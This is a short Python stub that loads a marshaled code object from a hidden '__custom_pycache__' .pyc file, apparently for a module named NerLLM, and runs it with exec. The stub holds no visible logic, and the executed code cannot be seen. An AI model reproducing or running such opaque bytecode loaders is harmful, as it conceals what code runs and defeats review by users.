
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'NerLLM_4a61e47bfad145c7abf0710aaff1806c.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
